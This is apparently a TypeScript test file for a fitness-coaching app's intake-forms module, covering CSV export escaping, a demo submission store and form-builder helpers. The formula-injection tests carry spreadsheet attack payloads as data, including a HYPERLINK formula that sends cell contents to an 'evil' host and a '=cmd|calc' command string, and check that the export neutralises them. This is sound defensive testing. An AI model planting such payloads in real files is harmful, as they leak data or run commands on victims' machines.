import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  SUBMISSION_STATUSES,
  isSubmissionStatus,
  normalizeFields,
  draftProblem,
  submissionsToCsv,
  fetchAllSubmissions,
  updateSubmission,
  deleteSubmission,
  _resetFormsDemoStore,
  type FormField,
  type IntakeFormRow,
  type SubmissionRow,
} from '../src/lib/forms.ts'

// Two halves. The first is the CSV, which is the only place in this module where
// a mistake reaches somebody else's machine: a quote in an answer can shift
// every column after it, and a leading `=` is a formula to Excel and Sheets. The
// second is the demo store, which is what the responses manager runs on with no
// database behind it, so the writes have to refuse and succeed there exactly as
// they do in production.

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const FORMS: IntakeFormRow[] = [
  {
    id: 'f-general', coachSlug: null, title: 'General Intake', description: null,
    isActive: true, fields: [], createdBy: null,
    createdAt: '2026-07-01T12:00:00.000Z', updatedAt: '2026-07-01T12:00:00.000Z',
  },
  {
    id: 'f-ronnie', coachSlug: 'ronnie-vallejo', title: 'Ronnie, Powerlifting Intake',
    description: null, isActive: true, fields: [], createdBy: null,
    createdAt: '2026-07-15T12:00:00.000Z', updatedAt: '2026-07-15T12:00:00.000Z',
  },
]

function row(over: Partial<SubmissionRow> = {}): SubmissionRow {
  return {
    id: 's-1',
    form_id: 'f-general',
    client_id: null,
    client_email: 'jordan@example.com',
    answers: { goals: 'Compete' },
    status: 'new',
    staff_notes: null,
    submitted_at: '2026-08-05T17:20:00.000Z',
    updated_at: '2026-08-05T17:20:00.000Z',
    ...over,
  }
}

const HEADER = '"Submitted","Form","Email","Submitter","Status","Answers"'

/** The data lines, without the header. */
const body = (csv: string) => csv.split('\n').slice(1)

// ---------------------------------------------------------------------------
// 1. submissionsToCsv: shape
// ---------------------------------------------------------------------------

test('an empty export is still a header, not an empty file', () => {
  const csv = submissionsToCsv([], FORMS)
  assert.equal(csv, HEADER)
})

test('six columns in the contracted order, every cell quoted', () => {
  const csv = submissionsToCsv([row()], FORMS)
  assert.equal(csv.split('\n').length, 2)
  assert.equal(
    body(csv)[0],
    '"2026-08-05T17:20:00.000Z","General Intake","jordan@example.com","Guest","new","{""goals"":""Compete""}"',
  )
})

test('submitted_at goes out as the stored ISO string, not a formatted date', () => {
  // Locale-free on purpose: a spreadsheet sorts ISO correctly and the file does
  // not change meaning depending on who pressed Export.
  const csv = submissionsToCsv([row({ submitted_at: '2026-01-02T03:04:05.678Z' })], FORMS)
  assert.ok(body(csv)[0].startsWith('"2026-01-02T03:04:05.678Z",'))
})

test('member and guest are decided by client_id, not by whether an email is present', () => {
  const rows = [
    row({ id: 'a', client_id: 'p-1', client_email: null }),
    row({ id: 'b', client_id: null, client_email: 'guest@example.com' }),
  ]
  const lines = body(submissionsToCsv(rows, FORMS))
  assert.ok(lines[0].includes('"Member"'))
  assert.ok(lines[0].includes('"",'))          // a member with no email on the row
  assert.ok(lines[1].includes('"Guest"'))
})

test('a form outside the fetch is named rather than left blank', () => {
  const csv = submissionsToCsv([row({ form_id: 'f-gone' })], FORMS)
  assert.ok(body(csv)[0].includes('"Unknown form"'))
})

test('every status reaches the file verbatim', () => {
  const rows = SUBMISSION_STATUSES.map((status, i) => row({ id: `s-${i}`, status }))
  const lines = body(submissionsToCsv(rows, FORMS))
  assert.deepEqual(
    lines.map(l => l.split(',')[4]),
    ['"new"', '"reviewed"', '"archived"'],
  )
})

test('one line per row, in the order given', () => {
  const rows = [
    row({ id: 'a', form_id: 'f-general' }),
    row({ id: 'b', form_id: 'f-ronnie' }),
    row({ id: 'c', form_id: 'f-general' }),
  ]
  const lines = body(submissionsToCsv(rows, FORMS))
  assert.equal(lines.length, 3)
  assert.ok(lines[1].includes('"Ronnie, Powerlifting Intake"'))
})

// ---------------------------------------------------------------------------
// 2. submissionsToCsv: escaping, which is the half that can hurt somebody
// ---------------------------------------------------------------------------

test('a comma inside a value does not shift the columns', () => {
  // The form title has a comma in it; the row must still be six fields once the
  // quoting is honoured.
  const csv = submissionsToCsv([row({ form_id: 'f-ronnie' })], FORMS)
  const line = body(csv)[0]
  assert.ok(line.includes('"Ronnie, Powerlifting Intake"'))
  assert.equal(line.match(/","/g)?.length, 5)   // five separators, six fields
})

test('a double quote is doubled, not dropped', () => {
  const csv = submissionsToCsv([row({ client_email: 'we"ird@example.com' })], FORMS)
  assert.ok(body(csv)[0].includes('"we""ird@example.com"'))
})

test('a newline inside an answer stays inside its quoted field', () => {
  const csv = submissionsToCsv([row({ answers: { goals: 'line one' } })], FORMS)
  assert.equal(csv.split('\n').length, 2)
  // JSON.stringify turns a real newline into the two characters \ and n, so the
  // record cannot be split by it either way.
  const csv2 = submissionsToCsv([row({ answers: { goals: 'one\ntwo' } })], FORMS)
  assert.equal(csv2.split('\n').length, 2)
  assert.ok(body(csv2)[0].includes('one\\ntwo'))
})

test('a formula in a cell is neutralised with a leading apostrophe', () => {
  for (const evil of [
    '=HYPERLINK("http://evil/"&A1,"click")',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
  ]) {
    const csv = submissionsToCsv([row({ client_email: evil })], FORMS)
    assert.ok(
      body(csv)[0].includes(`"'${evil.replace(/"/g, '""')}"`),
      `${evil} was not escaped`,
    )
  }
})

test('a tab or a carriage return leading a cell is neutralised too', () => {
  // Both can carry a formula past a naive check for =+-@.
  for (const lead of ['\t', '\r']) {
    const csv = submissionsToCsv([row({ client_email: `${lead}=1+1` })], FORMS)
    assert.ok(body(csv)[0].includes(`"'${lead}=1+1"`))
  }
})

test('a form title is escaped the same as anything else', () => {
  const forms: IntakeFormRow[] = [{ ...FORMS[0], title: '=cmd|calc' }]
  const csv = submissionsToCsv([row()], forms)
  assert.ok(body(csv)[0].includes(`"'=cmd|calc"`))
})

test('the answers column opens with a brace, so no answer can start a formula', () => {
  // Every answer rides inside one JSON object. Whatever an athlete typed, the
  // CELL begins with `{`, which no spreadsheet reads as a formula.
  const line = body(submissionsToCsv([row({ answers: { goals: '=1+1', note: '@evil' } })], FORMS))[0]
  assert.ok(line.includes(',"{'))     // the cell opens on a brace
  assert.ok(line.endsWith('}"'))      // and it is the last one
  assert.ok(line.includes('=1+1'))    // the answer itself is not mangled
  assert.ok(line.includes('@evil'))
})

test('a missing answers object exports as an empty object, not as undefined', () => {
  const csv = submissionsToCsv(
    [row({ answers: undefined as unknown as Record<string, unknown> })],
    FORMS,
  )
  assert.ok(body(csv)[0].endsWith('"{}"'))
})

test('submissionsToCsv is pure: it changes neither list', () => {
  const rows = [row()]
  const before = JSON.stringify({ rows, forms: FORMS })
  submissionsToCsv(rows, FORMS)
  assert.equal(JSON.stringify({ rows, forms: FORMS }), before)
})

// ---------------------------------------------------------------------------
// 3. isSubmissionStatus, the guard the writes lean on
// ---------------------------------------------------------------------------

test('isSubmissionStatus accepts exactly what the migration accepts', () => {
  assert.deepEqual(SUBMISSION_STATUSES, ['new', 'reviewed', 'archived'])
  for (const s of SUBMISSION_STATUSES) assert.equal(isSubmissionStatus(s), true)
  for (const s of ['triaged', 'NEW', '', null, undefined, 0, {}]) {
    assert.equal(isSubmissionStatus(s), false)
  }
})

// ---------------------------------------------------------------------------
// 4. The demo store, which is what the manager runs on with no database
// ---------------------------------------------------------------------------

test('the demo store hands back six responses, newest first', async () => {
  _resetFormsDemoStore()
  const rows = await fetchAllSubmissions(true)
  assert.notEqual(rows, null)
  assert.equal(rows!.length, 6)
  const dates = rows!.map(r => r.submitted_at)
  assert.deepEqual(dates, [...dates].sort().reverse())
})

test('the demo responses are mixed enough for every filter to bite', async () => {
  _resetFormsDemoStore()
  const rows = (await fetchAllSubmissions(true))!
  assert.equal(new Set(rows.map(r => r.form_id)).size, 2)
  assert.equal(new Set(rows.map(r => r.status)).size, 3)
  assert.ok(rows.some(r => r.client_id !== null))       // members
  assert.ok(rows.some(r => r.client_id === null))       // guests
  assert.ok(rows.some(r => r.staff_notes !== null))
  assert.ok(rows.some(r => r.staff_notes === null))
  // An unworked response reports that nobody has been here, exactly as 043's
  // backfill leaves the real rows.
  for (const r of rows) {
    if (r.staff_notes === null && r.status === 'new') {
      assert.equal(r.updated_at, r.submitted_at)
    }
  }
})

test('updateSubmission writes both columns and touches updated_at', async () => {
  _resetFormsDemoStore()
  const before = (await fetchAllSubmissions(true))![0]
  const res = await updateSubmission(before.id, { status: 'reviewed', staffNotes: 'Called them.' }, true)
  assert.deepEqual(res, { ok: true })

  const after = (await fetchAllSubmissions(true))!.find(r => r.id === before.id)!
  assert.equal(after.status, 'reviewed')
  assert.equal(after.staff_notes, 'Called them.')
  assert.ok(after.updated_at > before.updated_at)
  assert.equal(after.submitted_at, before.submitted_at)
})

test('an absent key is left alone, and null clears the note', async () => {
  _resetFormsDemoStore()
  const id = (await fetchAllSubmissions(true))![0].id
  await updateSubmission(id, { status: 'archived', staffNotes: 'keep me' }, true)

  await updateSubmission(id, { status: 'new' }, true)
  let after = (await fetchAllSubmissions(true))!.find(r => r.id === id)!
  assert.equal(after.staff_notes, 'keep me')
  assert.equal(after.status, 'new')

  await updateSubmission(id, { staffNotes: null }, true)
  after = (await fetchAllSubmissions(true))!.find(r => r.id === id)!
  assert.equal(after.staff_notes, null)
  assert.equal(after.status, 'new')
})

test('a whitespace-only note clears rather than storing an empty string', async () => {
  _resetFormsDemoStore()
  const id = (await fetchAllSubmissions(true))![0].id
  await updateSubmission(id, { staffNotes: '   ' }, true)
  const after = (await fetchAllSubmissions(true))!.find(r => r.id === id)!
  assert.equal(after.staff_notes, null)
})

test('a note is capped at 040s 4000 characters rather than bounced by the database', async () => {
  _resetFormsDemoStore()
  const id = (await fetchAllSubmissions(true))![0].id
  await updateSubmission(id, { staffNotes: 'x'.repeat(5000) }, true)
  const after = (await fetchAllSubmissions(true))!.find(r => r.id === id)!
  assert.equal(after.staff_notes?.length, 4000)
})

test('an off-list status is refused with a sentence, before any write', async () => {
  _resetFormsDemoStore()
  const id = (await fetchAllSubmissions(true))![0].id
  const res = await updateSubmission(id, { status: 'triaged' as never, staffNotes: 'sneak' }, true)
  assert.equal(res.ok, false)
  assert.ok(res.ok === false && /new, reviewed or archived/.test(res.message))

  // and the note did not go in on the back of the bad status
  const after = (await fetchAllSubmissions(true))!.find(r => r.id === id)!
  assert.equal(after.staff_notes, null)
})

test('an empty patch succeeds without pretending anything changed', async () => {
  _resetFormsDemoStore()
  const before = (await fetchAllSubmissions(true))![0]
  const res = await updateSubmission(before.id, {}, true)
  assert.deepEqual(res, { ok: true })
  const after = (await fetchAllSubmissions(true))!.find(r => r.id === before.id)!
  assert.equal(after.updated_at, before.updated_at)
})

test('updating a response that is not there is a refusal, not a crash', async () => {
  _resetFormsDemoStore()
  const res = await updateSubmission('no-such-id', { status: 'reviewed' }, true)
  assert.equal(res.ok, false)
  assert.ok(res.ok === false && res.message.length > 0)
})

test('deleteSubmission removes exactly one response', async () => {
  _resetFormsDemoStore()
  const rows = (await fetchAllSubmissions(true))!
  const res = await deleteSubmission(rows[2].id, true)
  assert.deepEqual(res, { ok: true })

  const after = (await fetchAllSubmissions(true))!
  assert.equal(after.length, rows.length - 1)
  assert.equal(after.find(r => r.id === rows[2].id), undefined)
})

test('deleting the same response twice says so the second time', async () => {
  _resetFormsDemoStore()
  const id = (await fetchAllSubmissions(true))![0].id
  assert.deepEqual(await deleteSubmission(id, true), { ok: true })
  const second = await deleteSubmission(id, true)
  assert.equal(second.ok, false)
  assert.ok(second.ok === false && /already gone/.test(second.message))
})

test('the reset seam puts the demo store back', async () => {
  _resetFormsDemoStore()
  const id = (await fetchAllSubmissions(true))![0].id
  await deleteSubmission(id, true)
  assert.equal((await fetchAllSubmissions(true))!.length, 5)
  _resetFormsDemoStore()
  assert.equal((await fetchAllSubmissions(true))!.length, 6)
})

test('a demo export joins the demo rows to their forms', async () => {
  _resetFormsDemoStore()
  const rows = (await fetchAllSubmissions(true))!
  const forms: IntakeFormRow[] = [
    { ...FORMS[0], id: 'demo-form-general', title: 'General Intake' },
    { ...FORMS[1], id: 'demo-form-ronnie', title: 'Ronnie Intake' },
  ]
  const csv = submissionsToCsv(rows, forms)
  assert.equal(body(csv).length, 6)
  assert.ok(!csv.includes('Unknown form'))
})

// ---------------------------------------------------------------------------
// 5. The pure builder helpers this module has always had and never tested
// ---------------------------------------------------------------------------

const field = (over: Partial<FormField> = {}): FormField => ({
  key: '', label: 'A question', type: 'text', required: false, ...over,
})

test('normalizeFields drops a field with no label', () => {
  assert.deepEqual(normalizeFields([field({ label: '   ' })]), [])
})

test('normalizeFields invents a key from the label when there is none', () => {
  const [f] = normalizeFields([field({ label: 'What are your goals?' })])
  assert.equal(f.key, 'what_are_your_goals')
})

test('normalizeFields makes duplicate keys unique so two questions cannot share an answer slot', () => {
  const out = normalizeFields([
    field({ key: 'goals', label: 'Goals' }),
    field({ key: 'goals', label: 'Goals again' }),
    field({ key: 'goals', label: 'And again' }),
  ])
  assert.deepEqual(out.map(f => f.key), ['goals', 'goals_2', 'goals_3'])
})

test('normalizeFields coerces an unknown type to text', () => {
  const [f] = normalizeFields([field({ type: 'rating' as never })])
  assert.equal(f.type, 'text')
})

test('a select with no usable options falls back to a text box', () => {
  const [f] = normalizeFields([field({ type: 'select', options: ['', '  '] })])
  assert.equal(f.type, 'text')
  assert.equal(f.options, undefined)
})

test('draftProblem names the first thing wrong, and nothing when the draft is ready', () => {
  const base = { coachSlug: null, title: '', description: '', isActive: true, fields: [] }
  assert.equal(draftProblem(base), 'Give the form a title.')
  assert.equal(draftProblem({ ...base, title: 'Intake' }), 'Add at least one question.')
  assert.equal(draftProblem({ ...base, title: 'Intake', fields: [field({ label: 'Name' })] }), null)
})
